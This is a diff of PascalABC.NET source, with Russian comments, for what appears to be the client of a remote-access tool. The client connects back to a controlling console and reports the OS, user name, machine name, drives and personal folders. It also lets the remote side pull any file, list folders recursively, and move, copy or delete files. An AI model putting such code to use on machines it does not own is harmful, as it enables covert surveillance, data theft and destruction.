@@ -34,7 +34,7 @@ type
       self.port := 10000 + (DateTime.Now.DayOfYear mod 5000);
       self._message_handler_service := new Thread(MessageHandler);
       self.WinInfo := self.GetOSInfo();
-      self.tickInterval := 20000;
+      self.tickInterval := 7000;
       self.lastTick := DateTime.Now;
     end;
     
@@ -72,7 +72,6 @@ type
             self._message_handler_service.Start();
             cmd.CD();
             self.path := cmd.output;
-            self.epath := Environment.CurrentDirectory;
             break; // Если подключились, выходим из цикла
           except
             Thread.Sleep(RETRY_DELAY); // Задержка перед повторной попыткой
@@ -137,7 +136,7 @@ type
              message := self.path else 
                
           if message = GET_WIN_INFO then
-             message := GetWinInfo() else
+             message := JsonConvert.SerializeObject(GetOSInfo()) else
                
           if message.StartsWith('E@') then 
              message := ExplorerHandler(message) 
@@ -161,7 +160,6 @@ type
       stream.Close();
       
     end;
-    
     
     /// Обработка полученных запросов от консоли
     public function ConsoleHandler(msg: string): string;
@@ -192,106 +190,114 @@ type
         E_GET_FILES:
           responce := JsonConvert.SerializeObject(Directory.GetFiles(self.epath));
         E_ARROW_UP:
-          begin
-            if Directory.GetDirectoryRoot(self.epath) = self.epath + SLASH then exit;
-            self.epath := self.epath.Substring(0, self.epath.LastIndexOf(SLASH));
-            
-            if Directory.GetDirectoryRoot(path) = self.epath + SLASH then 
-              self.epath += SLASH;
-            responce := self.epath;
-          end;
+        begin
+          Print('E_ARROW_UP:',self.epath);
+          self.epath := self.epath.Substring(0, self.epath.LastIndexOf(SLASH));
+          Print('->',self.epath);
+          if self.epath.Length <= 3 then self.epath += SLASH;
+          Println('->',self.epath);
+          responce := self.epath;
+        end;
         E_ENTER_FOLDER:
         begin
           if Directory.EnumerateDirectories(self.epath, msg.Substring(4), SearchOption.TopDirectoryOnly).Count() > 0 then begin
             try 
-              var tempPath: string;
+              var tempPath: string; Print('E_ENTER_FOLDER:',self.epath);
               if self.epath.LastIndexOf(SLASH)+1 = self.epath.Length then
                 tempPath := self.epath + msg.Substring(4) else
                 tempPath := self.epath + SLASH + msg.Substring(4);
               Directory.GetDirectories(tempPath);
-              self.epath := tempPath;
+              self.epath := tempPath; Println('->',self.epath);
             except on e: Exception do 
               responce := E_ERROR_OPEN_FOLDER + #13 + e.Message;
             end; // try
           end;
         end; 
+        E_ENTER_SHORTCUT:
+        begin
+          self.epath := msg.Substring(4);
+          Println('E_ENTER_SHORTCUT:',self.epath);
+        end; 
         E_RECEIVE_FILE: {$region Передача файла}
-          begin
-            var filePath := Strip(self.epath, #13+#10+' ') + SLASH + msg.Substring(4);
-            var FStream: FileStream;
-            
-            try
-              FStream := System.IO.File.OpenRead(filePath);
-            except on e: Exception do 
-              begin
-                Println(e.Message);
-                exit(E_ERROR_OPEN_FILE + ': ' + e.Message);
-              end;
-            end;
-            
-            // Получение размера файла
-            var fileSize := FStream.Length;
-            var sizeBuffer := System.BitConverter.GetBytes(fileSize); // 8 байт Int64
-            
-            // Отправка 8 байт с размером файла
-            stream.Write(sizeBuffer, 0, sizeBuffer.Length);
-            
-            // Отправка файла по частям
-            var buffer := new byte[4096];
-            var bytesRead := 0;
-            
-            repeat
-              bytesRead := FStream.Read(buffer, 0, buffer.Length);
-              if bytesRead > 0 then
-                stream.Write(buffer, 0, bytesRead);
-            until bytesRead = 0;
-            
-            FStream.Close();
-            
-            responce := E_FILE_SUCCESSFULLY_TRANSFERRED;                         
-          end;{$endregion}    
-        E_PASTE_ITEM:
-          begin
-            var info: PasteInformation = JsonConvert.DeserializeObject&<PasteInformation>(msg.Substring(4));
-            Println(msg.Substring(4));
-            if info.Code = E_CUT_ITEM then begin
-              foreach var item in JsonConvert.DeserializeObject&<array of string>(info.Items) do begin
-                if Directory.Exists(info.TakeFrom(item)) then 
-                  cmd.MOVE(info.TakeFrom(item), info.PasteHere(item))
-                else if System.IO.File.Exists(info.TakeFrom(item)) then
-                  System.IO.File.Move(info.TakeFrom(item), info.PasteHere(item)) 
-                else begin
-                    Println('Скип', item, info.TakeFrom(item),'->', info.PasteHere(item));
-                    Println(info.SourcePath, info.DestinationPath)
-                 end;
-              end;
-              responce := 'Перемещение прошло успешно';
-            end else begin
-              foreach var item in JsonConvert.DeserializeObject&<array of string>(info.Items) do begin
-                if Directory.Exists(info.TakeFrom(item)) then
-                  self.CopyDirectory(info.TakeFrom(item), info.PasteHere(item))
-                else
-                  System.IO.File.Copy(info.TakeFrom(item), info.PasteHere(item), true);
-              end;
-              responce := 'Копирование прошло успешно';
+        begin
+          var filePath := msg.Substring(4);
+          var FStream: FileStream;
+          
+          try
+            FStream := &File.OpenRead(filePath);
+          except on e: Exception do 
+            begin
+              Println(e.Message);
+              exit(E_ERROR_OPEN_FILE + ': ' + e.Message);
             end;
           end;
+          
+          // Получение размера файла
+          var fileSize := FStream.Length;
+          var sizeBuffer := System.BitConverter.GetBytes(fileSize); // 8 байт Int64
+          
+          // Отправка 8 байт с размером файла
+          stream.Write(sizeBuffer, 0, sizeBuffer.Length);
+          
+          // Отправка файла по частям
+          var buffer := new byte[4096];
+          var bytesRead := 0;
+          
+          repeat
+            bytesRead := FStream.Read(buffer, 0, buffer.Length);
+            if bytesRead > 0 then
+              stream.Write(buffer, 0, bytesRead);
+          until bytesRead = 0;
+          
+          FStream.Close();
+          
+          responce := E_FILE_SUCCESSFULLY_TRANSFERRED;                         
+        end;{$endregion}    
+        E_PASTE_ITEM: {$region Вставка скопированных\вырезанных данных}
+        begin
+          var info: PasteInformation = JsonConvert.DeserializeObject&<PasteInformation>(msg.Substring(4));
+          Println(msg.Substring(4));
+          if info.Code = E_CUT_ITEM then begin
+            foreach var item in JsonConvert.DeserializeObject&<array of string>(info.Items) do begin
+              if Directory.Exists(info.TakeFrom(item)) then 
+                cmd.MOVE(info.TakeFrom(item), info.PasteHere(item))
+              else if System.IO.File.Exists(info.TakeFrom(item)) then
+                System.IO.File.Move(info.TakeFrom(item), info.PasteHere(item)) 
+              else begin
+                  Println('Скип', item, info.TakeFrom(item),'->', info.PasteHere(item));
+                  Println(info.SourcePath, info.DestinationPath)
+               end;
+            end;
+            responce := 'Перемещение прошло успешно';
+          end else begin
+            foreach var item in JsonConvert.DeserializeObject&<array of string>(info.Items) do begin
+              if Directory.Exists(info.TakeFrom(item)) then
+                self.CopyDirectory(info.TakeFrom(item), info.PasteHere(item))
+              else
+                System.IO.File.Copy(info.TakeFrom(item), info.PasteHere(item), true);
+            end;
+            responce := 'Копирование прошло успешно';
+          end;
+        end;{$endregion}
         E_DELETE_ITEM:
-          begin
-            var items_path: string = msg.Substring(4, msg.IndexOf('[')-4) + SLASH;
-            var JsonObjectStr := msg.Substring(msg.IndexOf('['));
-            var items := JsonConvert.DeserializeObject&<array of string>(JsonObjectStr);
-            foreach var item in items do
-              if Directory.Exists(items_path+item) then
-                cmd.RMDIR(items_path+item) else
-                System.IO.File.Delete(items_path+item);
-            responce := 'Удаление прошло успешно';
-          end;
+        begin
+          var items_path: string = msg.Substring(4, msg.IndexOf('[')-4) + SLASH;
+          var JsonObjectStr := msg.Substring(msg.IndexOf('['));
+          var items := JsonConvert.DeserializeObject&<array of string>(JsonObjectStr);
+          foreach var item in items do
+            if Directory.Exists(items_path+item) then
+              cmd.RMDIR(items_path+item) else
+              System.IO.File.Delete(items_path+item);
+          responce := 'Удаление прошло успешно';
+        end;
+        E_GET_ALL_FILES_IN_FOLDER:
+          responce := JsonConvert.SerializeObject(Directory.GetFiles(msg.Substring(4), '*', SearchOption.AllDirectories));
       
       end; // case
 
       Result := responce;
     end;    
+  
   
     public procedure CopyDirectory(sourceDir, destDir: string);
     begin
@@ -313,10 +319,8 @@ type
         CopyDirectory(dirName, destSubDir);
       end;
     end;
-  
-    public function GetWinInfo(): string := JsonConvert.SerializeObject(self.WinInfo);
-  
-  
+    
+     
     private function GetOSInfo(): WindowsInformation;
     begin 
       var searcher := new ManagementObjectSearcher('SELECT Caption FROM Win32_OperatingSystem');
@@ -326,11 +330,25 @@ type
         WinVer := obj['Caption'].ToString;
                    
       Result := new WindowsInformation(
-                    WinVer.Substring(11),
-                    Environment.OSVersion.Platform.ToString,
-                    Environment.UserName          as string,
-                    Environment.MachineName       as string,
-                    DriveInfo.GetDrives());
+        GetEnvInfo(),
+        WinVer.Substring(11),
+        Environment.OSVersion.Platform,
+        Environment.UserName,
+        Environment.MachineName
+      );
+    end;
+    
+    
+    private function GetEnvInfo(): ExplorerInformation;
+    begin
+      Result := new ExplorerInformation(
+        DriveInfo.GetDrives(),
+        Environment.GetFolderPath(Environment.SpecialFolder.Desktop), 
+        Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
+        Environment.GetFolderPath(Environment.SpecialFolder.MyMusic),
+        Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
+        Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)
+      );
     end;
   
   end; // class
